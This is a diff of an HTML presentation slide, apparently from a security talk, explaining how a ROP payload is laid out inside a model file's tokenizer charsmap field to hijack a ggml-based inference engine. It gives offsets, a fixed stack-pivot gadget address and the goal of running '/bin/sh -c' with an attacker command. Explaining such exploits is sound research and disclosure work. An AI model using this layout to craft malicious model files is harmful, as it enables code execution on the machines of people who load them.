@@ -1,17 +1,39 @@
-<section>
-  <h2 class="section-title">The ROP blob &mdash; <code>precompiled_charsmap</code></h2>
-  <div class="card card-blue full-width">
-    <div class="card-header">UINT8 array — layout consumed during destructor unwinding</div>
-    <pre><code class="language-text">offset   value                  purpose
-──────   ────────────────────   ─────────────────────────────────────────────────
-  0      0                       1st ggml_backend_buffer_free → NULL check returns
-  8      PIVOT (0x236f81c)       2nd free → indirect call lands on the pivot gadget:
-                                   pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret
- 16 / 24 junk                    eaten by the gadget's pop r14 / pop rbp
- 32 ...   ROP chain              the gadget sequence (next slide)
-160 ...   command string         raw NUL-terminated bytes of the final argument</code></pre>
+<section class="dense">
+  <h2 class="section-title">The payload blob &mdash; and where its numbers come from</h2>
+  <div class="textbox" style="border-color: rgba(239,68,68,0.45); background: rgba(239,68,68,0.05);">
+    <p><span class="inline-tag tag-red">The goal</span> Make the engine run <code>execvp("/bin/sh", {"/bin/sh", "-c", &amp;cmd, NULL})</code>.</p>
   </div>
-  <div class="textbox" style="margin-top: 18px;">
-    <p>The blob is carried as a <code>UINT8</code> array so embedded <code>NUL</code> bytes in gadget addresses survive. After the pivot, <code>RSP</code> points into this very blob &mdash; the chain and the command string live <strong>inside the payload</strong>, not somewhere we had to spray to a known address.</p>
+  <div class="two-col" style="margin-top: 14px;">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">tokenizer.ggml.precompiled_charsmap (UINT8)</div>
+        <pre><code class="language-text">offset   contents
+──────   ────────────────
+   0     0  (NULL)
+   8     PIVOT  0x236f81c
+ 16,24   junk
+  32 …   ROP chain
+ 160 …   command text \0</code></pre>
+      </div>
+      <div class="card card-red" style="margin-top: 12px;">
+        <div class="card-header">what lives at 0x236f81c &mdash; the pivot gadget</div>
+        <pre><code class="language-text">pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret
+          ▲
+          └ the actual pivot: loads a new RSP that
+            points into our blob → the chain at +32</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-blue">
+        <div class="card-header">why those numbers</div>
+        <ul class="card-list">
+          <li><span class="inline-tag tag-red">0 / 8</span> the destructor we just saw frees two buffers back-to-back, read as consecutive <strong>8-byte</strong> pointers &mdash; <code>NULL</code> at 0, the live one one pointer later, at 8</li>
+          <li><span class="inline-tag tag-purple">PIVOT</span> <code>0x236f81c</code> is a real stack-pivot gadget <em>inside</em> the non-PIE binary &mdash; a <strong>fixed</strong> address found by scanning, no leak. Its <code>pop rsp</code> re-points the stack onto our blob</li>
+          <li><span class="inline-tag tag-cyan">16 / 24</span> swallowed by that gadget&apos;s trailing <code>pop r14 ; pop rbp</code>, so they can be junk; <code>ret</code> then lands on the chain at <span class="inline-tag tag-blue">32</span></li>
+          <li><span class="inline-tag tag-green">160</span> the command text, parked just past the chain</li>
+        </ul>
+      </div>
+    </div>
   </div>
+  <p class="slide-note">Chain <em>and</em> command share this one blob &mdash; after the pivot <code>RSP</code> points inside it, so the chain finds the command relative to itself. <code>UINT8</code> keeps the <code>NUL</code>-heavy addresses intact.</p>
 </section>
